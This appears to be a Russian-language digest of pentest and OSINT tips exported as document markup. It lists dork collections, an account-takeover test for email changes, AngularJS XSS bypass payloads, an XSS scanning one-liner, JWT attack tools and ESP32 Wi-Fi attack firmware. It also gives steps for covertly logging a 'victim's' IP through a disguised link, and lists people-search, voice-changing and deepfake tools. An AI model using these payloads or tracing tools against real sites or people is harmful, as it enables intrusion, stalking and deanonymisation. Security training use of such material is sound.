      <text:p text:style-name="P2">Подборка дорков для более чем 10 известных сервисов. Практически каждый из вас слышал про Google Dorks, но гораздо менее известны дорки для Yandex, DuckDuckGo, Bing, VirusTotal, Github, Shodan и т.д. Вот вам небольшая коллекция утилит и ссылок на списки дорков (https://github.com/cipher387/Dorks-collections-list/) для различных инструментов поиска.</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Google, Bing, Ecosia, Yahoo </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> Yandex: https://github.com/Zarcolio/sitedorks</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Google Dorks:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/BullsEye0/google_dork_list</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/sushiwushi/bug-bounty-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">https://github.com/rootac355/SQL-injection-dorks-list</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/unexpectedBy/SQLi-Dork-Repository</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/thomasdesr/Google-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/arimogi/Google-Dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/aleedhillon/7000-Google-Dork-List</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">DuckDuckGo dorks: https://github.com/d34dfr4m3/goDuck</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Github Dorks:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/techgaun/github-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/jcesarstef/ghhdb-Github-Hacking-Database</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/H4CK3RT3CH/github-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Shodan Dorks:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/humblelad/Shodan-Dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/AustrianEnergyCERT/ICS_IoT_Shodan_Dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/lothos612/shodan</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/jakejarvis/awesome-shodan-queries</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://github.com/IFLinfosec/shodan-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Virus Total Dorks: https://github.com/Neo23x0/vti-dorks</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">Binary Edge + Shodan + Google: https://github.com/iGotRootSRC/Dorkers</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P6">Отсутствие проверки сессии при смене почты. Если на сайте есть возможность сменить (или добавить) адрес электронной почты, то вот один из способов проверки данного функционала. Вам нужно создать две учетные записи на сайте. Назовем их victim@gmail.com и attacker@gmail.com, предполагая, что это соответсвенно жертва и злоумышленник. Теперь перейдем в учетную запись злоумышленника и изменим почту на 123@gmail.com, после чего ссылка для подтверждения будет отправлена на 123@gmail.com. Копируем эту ссылку, заходим в аккаунт жертвы victim@gmail.com и переходим по скопированной ссылке. Если адрес электронной почты жертвы будет обновлен до 123@gmail.com, то мы нашли уязвимость. Это произошло потому, что отсутствует проверка сессии пользователя и кто бы ни нажал на эту ссылку для проверки, его/ее учетная запись будет обновлена и привязана к новой почте. Таким образом, злоумышленник может скинуть жертве ссылку и если жертва перейдёт по ней, то злоумышленник захватит её аккаунт.</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T3">Небольшая</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">подборка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">полезных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ресурсов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">чеклистов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">по</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пентесту</text:span><text:span text:style-name="T2"> API: OWASP API Security Top 10 (</text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">русском</text:span><text:span text:style-name="T2"> (https://habr.com/ru/company/owasp/blog/547174/)); HolyTips (https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.pdf); API-Audit-Checklist (https://www.apiopscycles.com/api-audit-checklist); 31-days-of-API-Security-Tips (https://github.com/inonshk/31-days-of-API-Security-Tips); API Security Checklist (https://github.com/shieldfy/API-Security-Checklist); OAuth 2.0 Threat Model Pentesting Checklist (https://web.archive.org/web/20210607123429/https://www.binarybrotherhood.io/oauth2_threat_model.html); JWT Security Cheat Sheet (https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf); Microservices Security Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Microservices_security.html); GraphQL Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html); REST Assessment Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html); REST Security Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html); API Security Encyclopedia (https://apisecurity.io/encyclopedia/content/api-security-encyclopedia.htm)</text:span></text:p>
      <text:p text:style-name="P2">Набор инструментов по хэшированию:</text:p>
      <text:p text:style-name="P2">https://hashes.com - определит что за хэш, расшифрует значение</text:p>
      <text:p text:style-name="P2">https://www.online-decoder.com - то же самое. Можно определять кодировку автоматически, можно выбрать вручную </text:p>
      <text:p text:style-name="P2">https://gchq.github.io/CyberChef/ - набор инструментов для работы с кодировками, хэшами, форматами, файлами и т.д. </text:p>
      <text:p text:style-name="P26">Ну и ещё парочка конвертеров:</text:p>
      <text:p text:style-name="P26">http://0xcc.net/jsescape/  </text:p>
      <text:p text:style-name="P7">https://emn178.github.io/online-tools/index.html</text:p>
      <text:p text:style-name="P2">Ищем в Telegram. Часть 2. Поиск чатов, в которых состоит/состоял пользователь:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">1. @telesint_bot - отображает историю юзернейма, открытые и некоторые закрытые чаты;</text:span></text:p>
      <text:p text:style-name="P2">2. @ibhld_bot - показывает интересы пользователя на основе чатов, не всегда верно;</text:p>
      <text:p text:style-name="P2">3. @tgscanrobot - показывает чаты, где состоит пользователь, его упоминания, сообщения и т.д.;</text:p>
      <text:p text:style-name="P2">4. @TeleScanRo_bot - ищет чаты и выгружает из них сообщения конкретного юзера;</text:p>
      <text:p text:style-name="P2">5. @tginspectorbot - тоже выгружает сообщения из чатов;</text:p>
      <text:p text:style-name="P2">6. @eyeorla_bot - зеркало EOG, тоже ищет чаты (старые/актуальные);</text:p>
      <text:p text:style-name="P2">Бонус:</text:p>
      <text:p text:style-name="P2">1. Telegram Message Analyzer (https://github.com/zqtay/Telegram-Message-Analyzer) - позволяет анализировать html файлы сообщений из чатов и делать отчет в .txt, например, с самыми упоминаемыми словами.</text:p>
      <text:p text:style-name="P6">2. Telegram Nearby Map (https://github.com/tejado/telegram-nearby-map) - использует данные OpenStreetMap и геоданные из локальных Telegram чатов для определения более точной локации пользователя.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 12:</text:p>
      <text:p text:style-name="P2">1. Machine Translation (https://www.machinetranslation.com/) - машинный, умный переводчик;</text:p>
      <text:p text:style-name="P2">2. GPTGO (https://gptgo.ai/?hl=ru) - ChatGPT и поиск Google в одном флаконе;</text:p>
      <text:p text:style-name="P2">3. ReaderGPT (https://chrome.google.com/webstore/detail/readergpt-chatgpt-based-w/ohgodjgnfedgikkgcjdkomkadbfedcjd) - расширение для Сhrome, делает саммари вэб страницы;</text:p>
      <text:p text:style-name="P2">4. Adobe Firefly (https://firefly.adobe.com/) - фотошоп на стеройдах (банит ру айпи);</text:p>
      <text:p text:style-name="P2">5. Genius Sheets (https://www.geniussheets.com/) - делает финансовые отчеты и различные таблицы в Excel/Docs;</text:p>
      <text:p text:style-name="P2">6. CloneDub (https://www.clonedub.com/) - переводит аудио на другой язык, сохраняя голос; </text:p>
      <text:p text:style-name="P2">7. Fliki AI (https://fliki.ai/) - превращает текст в видео, бесплатный;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">8. Amazoncode AI (https://aws.amazon.com/ru/codewhisperer/) - помощник программиста, бесплатный;</text:span></text:p>
      <text:p text:style-name="P2">9. RoomGPT (https://www.roomgpt.io/) - дизайн/ре-дизайн помещений, можно загружать фото;</text:p>
      <text:p text:style-name="P6">10. 2D&amp;3D Video Converter (https://idatapp.com/software/3d-converter) - конвертирует 2D видео в 3D, много фич.</text:p>
      <text:p text:style-name="P26">Обход фильтрации в AngularJS: AngularJS (https://angularjs.org/) - это JavaScript-фреймворк с открытым исходным кодом, предназначенный для разработки одностраничных приложений. Часто используется различными конструкторами сайтов.</text:p>
      <text:p text:style-name="P26">Если вам требуется короткая полезная нагрузка для XSS в AngularJS 1.2.24 - 1.2.29, то можно воспользоваться той, что представлена ниже:</text:p>
      <text:p text:style-name="P2">{{[].%22-alert`1`-%22}}</text:p>
      <text:p text:style-name="P2">По этой ссылке (https://portswigger-labs.net/xss/angularjs.php?type=reflected&amp;csp=0&amp;version=1.2.26&amp;x=%7B%7B%5B%5D.%22-alert%601%60-%22%7D%7D) пример её выполнения для версии 1.2.26. Фильтрацию самой последней версии AngularJS можно обойти с помощью Unicode и HTML кодирования:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">{{$on.constructor('%26bsol;%26bsol;u%26bsol;u007b61}lert`1`')()}}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P6">По этой ссылке (https://portswigger-labs.net/xss/angularjs.php?type=reflected&amp;csp=0&amp;version=1.8.2&amp;x=%7B%7B$on.constructor(%27%26bsol;%26bsol;u%26bsol;u007b61%7Dlert%601%60%27)()%7D%7D) пример её выполнения для версии 1.8.2.</text:p>
      <text:p text:style-name="P2">Меняем голос на записи и онлайн:</text:p>
      <text:p text:style-name="P2">1. Voice Changer (https://voicechanger.io/) - загружаем запись своей речи и выбираем нужный нам эффект изменения голоса. Есть real-time функция записи прямо на сайте.</text:p>
      <text:p text:style-name="P2">2. Online Tone Generator (https://onlinetonegenerator.com/pitch-shifter.html) - похуже, без изменения голоса в режиме real-time, но с кучей настроек. Можно редактировать голос в файле. </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">3. Voice Changer (Android) <text:s/>(https://play.google.com/store/apps/details?id=com.ponicamedia.voicechanger)бесплатное приложение с функциями изменения голоса для пользователей Android.</text:span></text:p>
      <text:p text:style-name="P2">4. Voice Spice (https://voicespice.com/) - простой рекордер, который позволяет записывать голос, меняя тональность и громкость в режиме реального времени или задавая готовые настройки, дабы имитировать речь мужчины, женщины, робота, космической белки, адского демона и так далее. </text:p>
      <text:p text:style-name="P2">5. Voice Changer Plus (iOS) (https://apps.apple.com/ru/app/voice-changer-plus/id339440515) - еще одно бесплатное приложение для работы с голосом.</text:p>
      <text:p text:style-name="P2">6. VIPole Secure Messenger - есть функция изменения голоса при звонке. </text:p>
      <text:p text:style-name="P7">7. TurboTel (https://play.google.com/store/apps/details?id=ellipi.messenger&amp;hl=ru&amp;gl=US) - Telegram-клиент с функцией изменения голоса при отправке аудисообщения</text:p>
      <text:p text:style-name="P2">Инструменты для поиска людей в интернете. Допустим, вы хотите найти в интернете все доступные следы человека. Исключительно из благих намерений. Прошлись по трендовым в Тик Токе фичам и выбрали только рабочие варианты.</text:p>
      <text:p text:style-name="P2">1. Найти по фото человека, где он засветился - PimEyes (http://pimeyes.com/). Довольно точно отыскивает изображения. В бесплатной версии не позволит открыть конкретную ссылку на найденный снимок, но отобразит ее часть - это отличная подсказка, где искать дальше.</text:p>
      <text:p text:style-name="P26">2. Проверить, на каких площадках зарегистрированы аккаунты на конкретный email или номер телефона - SEON Fraud Prevention (http://seon.io/). Бонусом сообщит, засвечены ли эти данные в сливах и если да, то в каких (сверить количество сливов можно по Have I Been Pwned (http://haveibeenpwned.com/)).</text:p>
      <text:p text:style-name="P26">3. Найти по юзернейму все профили - sherlock-project (http://github.com/sherlock-project/sherlock). Инструмент соберет ссылки на все сайты, где зарегистрирован конкретный юзернейм - включая давно забытые человеком аккаунты.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Простой способ поиска ошибок в ответах сервера. Очень полезно отслеживать сообщения об ошибках сервера и получать оповещения о них, потому что это часто остается незамеченным для аудитора, который смотрит на приложение со стороны пользователя. Чтобы обнаружить режим отладки в </text:span><text:soft-page-break/><text:span text:style-name="T3">Symfony, ошибки SQL, ошибки Tomcat, ошибки раскрытия версий, и многое другое через Burpsuite и httpx, выполните следующие шаги:</text:span></text:p>
      <text:p text:style-name="P2">1. Установите расширение error-message-check (https://github.com/PortSwigger/error-message-checks) для Burpsuite</text:p>
      <text:p text:style-name="P2">2. Настройте скоуп и выполните httpx со всеми возможными методами (-x all): httpx -l urls.txt -threads 100 -x all-http-proxy http://127.0.0.1:8080</text:p>
      <text:p text:style-name="P7">3. Запустите пассивное сканирование в Burpsuite.</text:p>
      <text:p text:style-name="P2">Этот репозиторий состоит из инструментов /ссылок, которые эксперт может использовать во время пентеста/RedTeam. Если инструмент выполняет несколько функций, например собирает поддомены и URL-адреса, он будет указан в двух местах:</text:p>
      <text:p text:style-name="P2">• Search Engines - (https://github.com/wddadk/Offensive-OSINT-Tools#-search-engines)</text:p>
      <text:p text:style-name="P2">• Emails collector - (https://github.com/wddadk/Offensive-OSINT-Tools#-emails-collector)</text:p>
      <text:p text:style-name="P2">• References in the code - (https://github.com/wddadk/Offensive-OSINT-Tools#-references-in-the-code)</text:p>
      <text:p text:style-name="P2">• SubDomain collector - (https://github.com/wddadk/Offensive-OSINT-Tools#-subdomain-collector)</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">• URL collerctor - (https://github.com/wddadk/Offensive-OSINT-Tools#-url-collerctor)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">• Intelligence - (https://github.com/wddadk/Offensive-OSINT-Tools#-intelligence)</text:p>
      <text:p text:style-name="P2">• Network Info - (https://github.com/wddadk/Offensive-OSINT-Tools#-network-info)</text:p>
      <text:p text:style-name="P2">• DnsHistory - (https://github.com/wddadk/Offensive-OSINT-Tools#-dnshistory)</text:p>
      <text:p text:style-name="P2">• FTP servers - (https://github.com/wddadk/Offensive-OSINT-Tools#-ftp-servers)</text:p>
      <text:p text:style-name="P2">• Passive Infrastructure scanner - (https://github.com/wddadk/Offensive-OSINT-Tools#-passive-infrastructure-scanner)</text:p>
      <text:p text:style-name="P2">• Microsoft Excange - (https://github.com/wddadk/Offensive-OSINT-Tools#-microsoft-excange)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">• Telegram - (https://github.com/wddadk/Offensive-OSINT-Tools#-telegram)</text:span></text:p>
      <text:p text:style-name="P2">• Google Dorks - (https://github.com/wddadk/Offensive-OSINT-Tools#-google-dorks)</text:p>
      <text:p text:style-name="P7">• Nickname search - (https://github.com/wddadk/Offensive-OSINT-Tools#-nickname-search)</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 13:</text:p>
      <text:p text:style-name="P34">1. Everything (https://www.voidtools.com/ru-ru/) - быстро находит файлы и папки на вашем компьютере буквально пока вы печатаете их название;</text:p>
      <text:p text:style-name="P34">2. GEN-2 (https://app.runwayml.com/video-tools/teams/) - делает из картинок оживленные изображения;</text:p>
      <text:p text:style-name="P2">3. Replicate (https://replicate.com/methexis-inc/img2prompt) - реверсивная нейросеть, которая раскладывает картинку на текстовые подсказки (промты);</text:p>
      <text:p text:style-name="P2">4. WaJourney (https://audio-agi.github.io/WavJourney_demopage/) - озвучивает диалоги, добавляя к ним фоновое сопровождение;</text:p>
      <text:p text:style-name="P2">5. LingoStar (https://app.lingostar.ai/) - делает качественный перевод текста и может проверить ваше произношение;</text:p>
      <text:p text:style-name="P7">6. ChatDOC (https://chatdoc.com/) - делает выжимки из .pdf файлов</text:p>
      <text:p text:style-name="P2">Ищем в Telegram. Часть 3:</text:p>
      <text:p text:style-name="P2">1. Telegram Tracker (https://github.com/estebanpdl/telegram-tracker) - софт, который соединяется с Telegram API и генерирует JSON файл (бэкап) любого канала, включая медиа и посты. </text:p>
      <text:p text:style-name="P2">2. Tgdev (https://tgdev.io/tme/) - ищет Telegram каналы и посты по ключевым словам.</text:p>
      <text:p text:style-name="P2">3. Telegram Sender (https://chrome.google.com/webstore/detail/tg-sender-tg-bulk-message/kchbblidjcniipdkjlbjjakgdlbfnhgh) - расширение, которое собирает участников с чата и позволяет отправлять им рассылки. </text:p>
      <text:p text:style-name="P2">4. Telegram Search Engine (https://chrome.google.com/webstore/detail/tg-search-engine-tg-group/ilpgiemienkecbgdhdbgdjkafodgfojl) - расширение, предназначенное для сбора ссылок на Telegram каналы и чаты.</text:p>
      <text:p text:style-name="P7">5. Creation Date (https://t.me/creationdatebot) - бот, показывающий примерную дату создания Telegram аккаунта</text:p>
      <text:p text:style-name="P15">5 ресурсов для улучшения навыков взлома. В этом посте отобраны топ-5 ресурсов для совершенствования ваших навыков.</text:p>
      <text:p text:style-name="P2">1. Академия веб-безопастности от PortSwigger (https://portswigger.net/web-security): Разработчики BurpSuite теперь предоставляют бесплатное онлайн-обучение безопасности веб-приложений. Тренинг содержит учебные пособия и лабораторные работы практически по каждой уязвимости, часто встречающейся в современных веб-приложениях.</text:p>
      <text:p text:style-name="P2">2. HackTheBox: (https://www.hackthebox.com/) Это набор уязвимых приложений, каждая из которых уникальна, пользователь должен скомпроментировать ее и получить необходимые привилегии.</text:p>
      <text:p text:style-name="P2">3. (https://www.hackthissite.org/) HackThisSite: (https://www.hackthissite.org/) Это место очень известно среди хакеров, вероятно, потому, что его основатель был арестован за незаконную кибердеятельность. HackThisSite универсален. Хакерские задачи на этом сайте называются “миссиями” и классифицируются следующим образом: Основные миссии; Реалистичные миссии; Прикладные миссии; Криминалистические миссии; Миссии по программированию</text:p>
      <text:p text:style-name="P2">4. HellBound Hackers: (https://hbh.sh/home) На этом ресурсе есть статьи, учебные пособия, проблемы со взломом и форум. Вы можете практиковать веб-взлом, отслеживание электронной почты, взлом программного обеспечения, проблемы шифрования, стеганографию и даже социальную инженерию.</text:p>
      <text:p text:style-name="P7">5. Vulnhub: <text:s/>(https://www.vulnhub.com/)Это центр уязвимых виртуальных машин. Он индексирует намеренно уязвимые машины, созданные экспертами из разных мест. Уязвимые машины можно загрузить и установить на своей платформе. VulnHub разнообразен, поскольку в нем размещаются уязвимые машины на основе банковских веб-приложений и CTF базового уровня.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 14:</text:p>
      <text:p text:style-name="P2">1. Blackink (http://blackink.ai/) - превращает идею татуировки в эскиз, который можно примерить на тело с помощью AR;</text:p>
      <text:p text:style-name="P2">2. TheGamifAI (https://gamifai.net/) - ИИ для разработки игр, использует текстовые подсказки для генерации элементов игры;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">3. Lora The Explorer (https://huggingface.co/spaces/multimodalart/LoraTheExplorer) - каталог со всеми лучшими модификациями Stable Diffusion XL;</text:span></text:p>
      <text:p text:style-name="P2">4. Adobe Express (https://www.adobe.com/express/) - очередной убийца фотошопа, идеален для генерации обложек для видео или заставок;</text:p>
      <text:p text:style-name="P2">5. Neuralwriter (https://neuralwriter.com/ru/) - перефразирует ваш текст на 27 языках мира. Есть три режима работы. </text:p>
      <text:p text:style-name="P7">6. Project IDX (https://idx.dev/) - браузерная среда разработки от Google.</text:p>
      <text:p text:style-name="P2">Инструменты для поиска людей в интернете-2. Продолжаем искать рабочие способы поиска всех следов конкретного человека в интернете. На этот раз оценивали все подряд фичи, которые трендятся в Тик Токе, чтобы предупредить, что и пробовать не стоит.</text:p>
      <text:p text:style-name="P2">1. Узнать IP и местонахождение человека. Берем ссылку на любую картинку или мем, закидываем в любой IP Logger в поиске - например, этот https://iplogger.org/ - сокращаем ссылку и отправляем ее жертве в мессенджере (лучше всего в Telegram - встройте ссылку в слово или просто удалите сниппет, чтобы человеку пришлось перейти по ссылке). После перехода по ссылке на сайте отобразится IP-адрес человека. Результат: РАБОТАЕТ. Сайт отобразил страну, IP, детали устройства - ОС, браузер - и даже попытался определить местоположение (не очень удачно).</text:p>
      <text:p text:style-name="P2">2. Найти по фотографии аккаунты человека в соцсетях. Если загрузить снимок в приложение Reverse Image Search &amp; Finder (iOS), оно найдет все аккаунты в Сети с этим лицом на фото профиля. Результат: НЕ РАБОТАЕТ. После загрузки фотографии приложение запустило поиск, который так и не закончился, одновременно намекая, что платная версия гораздо быстрее.</text:p>
      <text:p text:style-name="P2">3. Найти адрес и телефон человека по имени и фамилии. Блогеры Тик Тока предлагают множество сайтов, где можно провести поиск: peoplefinder.com, thatsthem.com, kiwisearches.com. Результат: НЕ РАБОТАЕТ. Эти сайты рассчитаны в основном на жителей США, Канады, в лучшем случае - других англоязычных стран, российским пользователям там нечего ловить.</text:p>
      <text:p text:style-name="P7">Итого - работает примерно 33,3(3)% хаков в Тик Токе, а на самом деле намного меньше. В следующем выпуске обратимся к средствам OSINT, нацеленным конкретно на Рунет.</text:p>
      <text:p text:style-name="P20"><text:soft-page-break/><text:span text:style-name="T3">https://github.com/risinek/esp32-wifi-penetration-tool https://www.youtube.com/watch?v=9I3BxRu86GE - ESP32 wifi penetration tool: Этот проект представляет прошивку для платформы ESPЗ2 (https://t.me/AliExpress_Hacker/718) с помощью которой открывается возможность реализовать различные атаки на WIFI. Функции: Захват PMKID; Захват и анализ рукопожатия WPA/WPA2; Атаки деаутентификации с использованием различных методов; Атаки отказа в обслуживании; Форматирование захваченного трафика в формат PCAP; Разбор захваченных рукопожатий в файл HCCAPX, готовый для взлома Hashcat; Пассивное рукопожатие; Легко расширяемая структура для реализации новых атак; Точка доступа управления для простой настройки на ходу, например, со смартфона и многое другое</text:span></text:p>
      <text:p text:style-name="P7">5 инструментов для GEOINT расследований. Часто в OSINT расследованиях приходиться иметь дело с выяснением местоположения по снимку. Для многих не секрет, что важна каждая деталь, поэтому чтобы поиски были более результативными, предлагаем ознакомиться с инструментами подборки: EarthCam (https://www.earthcam.com/) - агрегатор рабочих веб-камер по всему миру; Geoestimation (https://labs.tib.eu/geoestimation/) - оценивает местоположение фотографии с помощью ИИ; Airportwebcams (https://airportwebcams.net/) - агрегатор веб-камер в различных аэропортах мира; Peakvisor (http://peakvisor.com/) - cодержит данные о более 1 000 000 гор по всему миру, часто используется в расследованиях для опознавания локации по очертанию рельефа на заднем плане; F4Map (https://demo.f4map.com/#lat=52.5177982&amp;lon=13.4070592&amp;zoom=17&amp;camera.phi=-60.734) - карта мира с 3D-зданиями и тенями от них в различное время суток.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">Прячем файлы в изображении на Windows: Для начала поместите файлы, которые хотите спрятать, в пустую папку. Затем заархивируйте эту папку, например, в файл «secret.zip». Можно использовать утилиту WinRAR. Рядом с новым архивом разместите картинку, в которую хотите спрятать все изображения (в нашем примере «cow.jpg»). Нажмите «Win+R», в поле поиска введите «cmd» и откройте командную строку. Используйте команду «cd», чтобы перейти в папку, где лежит созданный архив с картинкой. Команда «dir» </text:span><text:soft-page-break/><text:span text:style-name="T3">поможет узнать где вы находитесь и просмотреть содержимое каталога. Находясь в нужном каталоге, введите команду «copy /b сow.jpg+secret.zip supercow.jpg». Файлы будут помещены внутрь нового изображения с именем «supercow.jpg». С виду это будет обычная картинка. Чтобы просмотреть спрятанные файлы, измените расширение у нового изображения, переименовав файл «supercow.jpg» → «supercow.zip». Затем используйте WinRAR, чтобы получить доступ к скрытым файлам</text:span></text:p>
      <text:p text:style-name="P2">JSON Web Token - это JSON объект, который определен в открытом стандарте RFC 7519.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 Инструменты для автоматизации JWT-атаки:</text:p>
      <text:p text:style-name="P2">1. jwtXploiter (https://github.com/DontPanicO/jwtXploiter) - это Python-инструмент, предназначенный для автоматизации взлома JWT. Он позволяет проверить соответствие всех известных CVE для JWT и поддерживает различные виды атак на JWT, начиная от простого взлома и до выполнения атак с использованием самозаверяющих токенов!</text:p>
      <text:p text:style-name="P2">2. JSON Web Tokens (https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) - это дополнение для Burpsuite, которое автоматизирует распространенные атаки на JWT. Кроме того, оно позволяет быстро выполнять кодирование / декодирование и проверку токенов.</text:p>
      <text:p text:style-name="P2">3. JWT Tool <text:s/>(https://github.com/ticarpi/jwt_tool)- это широко используемый инструмент на языке Python, который позволяет производить проверку всех возможных атак, которые могут уязвимо существовать в веб-приложении.</text:p>
      <text:p text:style-name="P35">4. JWT Editor (https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) - это дополнение для Burpsuite, которое обеспечивает возможность удобно изменять JWT-токены и быстро проверять различные методы обхода.</text:p>
      <text:p text:style-name="P36">Используем блага нейросетей. Часть 15:</text:p>
      <text:p text:style-name="P2">1. DrLambda (https://drlambda.ai/) - может превратить любой документ, сайт или видео в презентацию;</text:p>
      <text:p text:style-name="P2">2. Suno (https://www.suno.ai/) - создаст для вас песню по вашему тексту;</text:p>
      <text:p text:style-name="P34">3. Heygen (https://app.heygen.com/guest/home) - cервис, который умеет переводить видео, сохраняя при этом голос говорящего и синхронизируя движение губ;</text:p>
      <text:p text:style-name="P34">4. FaceFusion (https://github.com/facefusion/facefusion) - нейронка для создания качественных дипфейков:</text:p>
      <text:p text:style-name="P2">5. Launchaco (https://www.launchaco.com/logo) - для быстрого создания логотипов;</text:p>
      <text:p text:style-name="P2">6. Vectorizer (https://vectorizer.ai/) - улучшит качество любых jpg файлов;</text:p>
      <text:p text:style-name="P2">7. MathGPTPro (https://mathgptpro.com/) - решает математические задачи, ChatGPT + Wolfram Alpha;</text:p>
      <text:p text:style-name="P7">8. Stable Audio (https://www.stableaudio.com/) - новая нейросеть для создания саундтреков.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">EXIF - данные, метаданные. Файлы EXIF​​(сменный формат файлов изображений) хранят важные данные о фотографиях. Почти все цифровые камеры создают эти файлы данных каждый раз, когда вы делаете новый снимок. Метаданные изображения относятся к конкретным деталям и информации, касающейся конкретного файла фотографии. Инструменты для работы с EXIF: 1. Exiftool (https://www.kali.org/tools/libimage-exiftool-perl/); 2. Exifprobe (https://www.kali.org/tools/exifprobe/); 3. MetaData2Go (https://www.metadata2go.com/view-metadata); 4. ExifMeta (https://exifmeta.com/); 5. OnlineExifViewer (https://onlineexifviewer.com/). Не уследив за метаданными, это может привести вас к неприятностям, как к примеру Джона Макафи однажды рассекретили Vice (https://habr.com/ru/articles/161297/). Журналисты Vice забыли одну важную деталь, что iPhone сохраняет в метаданных GPS-координаты. Они быстро изменили фотографию, выложили версию со стёртыми EXIF-полями, но было уже поздно. Поиск уязвимостей XSS одной командой: Для этого нам потребуется предварительно установить несколько утилит на языке GO (ну и соответсвенно сам GO тоже должен быть установлен). В роли </text:span><text:soft-page-break/><text:span text:style-name="T3">краулера утилита - gospider (https://github.com/jaeles-project/gospider), представляющая собой веб-краулер для быстрого сбора URL-адресов, связанных с сайтом. Вторая - qsreplace (https://github.com/tomnomnom/qsreplace). Она принимает на вход URL-адреса и заменяет все значения строки запроса на значение, указанное пользователем. Последний и самый важный инструмент поиска на XSS - dalfox (https://github.com/hahwul/dalfox). Это производительный и быстрый инструмент для анализа параметров запроса и выявления различных типов XSS и других базовых уязвимостей. После установки необходимо заменить строку https://example.com на адрес тестируемого сайта и выполнить команду: gospider -s https://example.com -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt</text:span></text:p>
